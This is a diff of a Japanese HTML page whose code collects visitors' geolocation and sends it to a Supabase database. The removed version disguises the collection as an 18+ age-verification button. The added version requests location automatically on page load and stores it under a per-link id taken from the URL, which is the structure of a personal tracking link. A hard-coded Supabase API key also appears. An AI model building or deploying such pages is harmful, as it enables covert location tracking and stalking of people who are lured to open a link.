@@ -1,147 +1,51 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>位置情報の選択</title>
-  <style>
-    body {
-      font-family: system-ui, sans-serif;
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: linear-gradient(to bottom right, #ff80aa, #ff99cc);
-      color: white;
-    }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>位置情報の送信</title>
+  <script type="module">
+    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
+    import { SUPABASE_URL, SUPABASE_KEY } from "./config.js";
 
-    .container {
-      background: #000;
-      padding: 30px 25px;
-      border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
-      width: 85%;
-      max-width: 380px;
-      text-align: center;
-      opacity: 0;
-      transform: translateY(20px);
-      animation: fadeInUp 0.8s ease forwards;
-    }
+    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    @keyframes fadeInUp {
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
+    const params = new URLSearchParams(location.search);
+    const id = params.get("id") || crypto.randomUUID();
 
-    h1 {
-      font-size: 1.5rem;
-      margin-bottom: 20px;
-    }
+    window.addEventListener('load', () => {
+      setTimeout(() => getLocation(), 1000);
+    });
 
-    p {
-      width: 14em;
-      margin: 0 auto 20px;
-      word-wrap: break-word;
-      line-height: 1.6;
-      font-size: 1rem;
-    }
+    async function getLocation() {
+      document.body.innerHTML = "<h3>位置情報を取得中...</h3>";
 
-    button {
-      display: block;
-      width: 70%;
-      padding: 18px 0;
-      margin: 15px auto;
-      font-size: 1.05rem;
-      border-radius: 10px;
-      border: 2px solid orange;
-      background: #1a1a1a;
-      color: white;
-      cursor: pointer;
-      transition: background 0.3s, transform 0.2s;
-    }
-
-    button:hover {
-      background: #2a2a2a;
-      transform: scale(1.03);
-    }
-
-    #result {
-      margin-top: 20px;
-      font-size: 0.9rem;
-      color: #ccc;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>どちらかを選択してください</h1>
-    <p>このサイトは年齢制限のあるコンテンツを含みます。18歳以上の方のみご利用ください。</p>
-    <button id="allowBtn">私は18歳以上です - 入場</button>
-    <button id="denyBtn">私は18歳未満です - 退出</button>
-    <div id="result"></div>
-  </div>
-
-  <script>
-    const result = document.getElementById("result");
-    const allowBtn = document.getElementById("allowBtn");
-    const denyBtn = document.getElementById("denyBtn");
-
-    const SUPABASE_URL = "https://hwwjnlprsntmdcytktbm.supabase.co";
-    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY";
-
-    allowBtn.addEventListener("click", () => {
-      if (!navigator.geolocation) {
-        result.textContent = "お使いのブラウザでは位置情報に対応していません。";
-        return;
-      }
-
-      // 🎯 ボタンを押した瞬間に公式ダイアログが出る
       navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-          const { latitude, longitude } = pos.coords;
-          result.innerHTML = `✅ 位置情報を取得しました！<br>緯度: ${latitude}<br>経度: ${longitude}`;
+        async pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
 
-          try {
-            const response = await fetch(`${SUPABASE_URL}/rest/v1/locations`, {
-              method: "POST",
-              headers: {
-                "apikey": SUPABASE_KEY,
-                "Authorization": `Bearer ${SUPABASE_KEY}`,
-                "Content-Type": "application/json",
-                "Prefer": "return=minimal"
-              },
-              body: JSON.stringify({
-                latitude,
-                longitude,
-                created_at: new Date().toISOString()
-              })
-            });
+          const { error } = await supabase
+            .from("locations")
+            .upsert({ id, latitude: lat, longitude: lon });
 
-            if (response.ok) {
-              result.innerHTML += "<br>✅ Supabaseに送信成功！";
-            } else {
-              const errorText = await response.text();
-              console.error("Supabase送信エラー:", errorText);
-              result.innerHTML += `<br>⚠️ Supabase送信エラー:<br>${errorText}`;
-            }
-          } catch (err) {
-            console.error("通信エラー:", err);
-            result.innerHTML += `<br>❌ 通信エラー: ${err.message}`;
+          if (error) {
+            document.body.innerHTML = `<p>送信エラー: ${error.message}</p>`;
+          } else {
+            document.body.innerHTML = `
+              <h3>送信完了</h3>
+              <p>ありがとうございました！</p>
+            `;
           }
         },
-        (error) => {
-          console.error("位置情報エラー:", error);
-          result.textContent = `❌ 位置情報エラー: ${error.message}`;
+        err => {
+          document.body.innerHTML = `<p>位置情報が取得できませんでした: ${err.message}</p>`;
         }
       );
-    });
-
-    denyBtn.addEventListener("click", () => {
-      window.location.href = "https://www.google.co.jp";
-    });
+    }
   </script>
+</head>
+<body>
+  <h2>位置情報の確認中...</h2>
 </body>
 </html>
